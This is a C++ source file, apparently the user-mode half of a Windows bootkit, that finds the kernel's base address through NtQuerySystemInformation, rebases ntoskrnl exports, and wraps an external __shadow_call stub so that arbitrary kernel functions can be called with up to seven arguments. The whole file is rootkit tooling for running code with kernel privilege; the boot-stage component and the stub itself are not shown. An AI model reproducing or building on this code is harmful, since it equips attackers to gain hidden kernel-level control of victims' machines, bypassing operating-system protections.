#include "bootkit.h"

extern "C" uint64_t NtShutdownSystem = 0;
extern "C" uint64_t __shadow_call(uint64_t arg);

Bootkit::Bootkit()
{
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    NtShutdownSystem = (uint64_t)GetProcAddress(ntdll, "NtShutdownSystem");
}

uint64_t Bootkit::get_kernel_base() 
{
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) 
    {
        return 0;
    }

    uint64_t NtQuerySystemInformation = (uint64_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation)
    {
        return 0;
    }

    uint64_t size = 0;
    ((uint32_t(*)(uint32_t, uint64_t, uint32_t, uint64_t*))NtQuerySystemInformation)(11 /* SystemModuleInformation */, 0, 0, &size);

    uint64_t module_info = (uint64_t)VirtualAlloc(nullptr, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!module_info)
    {
        return 0;
    }

    if (((uint32_t(*)(uint32_t, uint64_t, uint32_t, uint64_t*))NtQuerySystemInformation)(11 /* SystemModuleInformation */, module_info, size, &size) != 0)
    {
        VirtualFree((void*)module_info, 0, MEM_RELEASE);
        return 0;
    }

    uint64_t kernel_base = *(uint64_t*)(uint8_t*)(module_info + 0x08 /* ->Modules */ + 0x10 /* ->ImageBase */);
    VirtualFree((void*)module_info, 0, MEM_RELEASE);

    return kernel_base;
}

uint64_t Bootkit::get_kernel_export(LPCSTR name)
{
    HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (!ntoskrnl)
    {
        return 0;
    }

    uint64_t export_address = (uint64_t)GetProcAddress(ntoskrnl, name);
    if (export_address == 0)
    {
        FreeLibrary(ntoskrnl);
        return 0;
    }

    uint64_t offset = export_address - (uint64_t)ntoskrnl;
    uint64_t kernel_base = get_kernel_base();

    return kernel_base + offset;
}

uint64_t __fastcall Bootkit::call(uint64_t address, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7)
{
    args_t args;
    args.address = address;
    args.a1 = a1;
    args.a2 = a2;
    args.a3 = a3;
    args.a4 = a4;
    args.a5 = a5;
    args.a6 = a6;
    args.a7 = a7;

    return __shadow_call((uint64_t)&args);
}

uint64_t __fastcall Bootkit::call(LPCSTR name, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7)
{
    args_t args;
    args.address = get_kernel_export(name);
    args.a1 = a1;
    args.a2 = a2;
    args.a3 = a3;
    args.a4 = a4;
    args.a5 = a5;
    args.a6 = a6;
    args.a7 = a7;

    return __shadow_call((uint64_t)&args);
}